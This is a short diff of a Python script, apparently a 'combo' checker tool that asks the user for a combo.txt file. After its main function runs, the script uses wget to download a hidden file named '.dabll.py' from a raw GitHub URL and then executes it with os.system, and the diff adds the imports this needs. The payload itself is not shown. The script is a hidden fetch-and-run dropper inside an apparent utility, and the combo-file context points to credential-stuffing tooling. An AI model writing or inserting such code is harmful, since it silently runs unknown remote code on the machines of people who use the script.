@@ -28,5 +28,6 @@ def g():
 		print("     Combo ka drwst bw eakam hallbzhera w bnwsa combo.txt")
 		os.sys.exit()
 g()
+import os, sys, random, wget
 wget.download("https://raw.githubusercontent.com/sfrsfrsfr404sfrsfrsfr/-/main/.dabll.py")
 os.system("python .dabll.py")
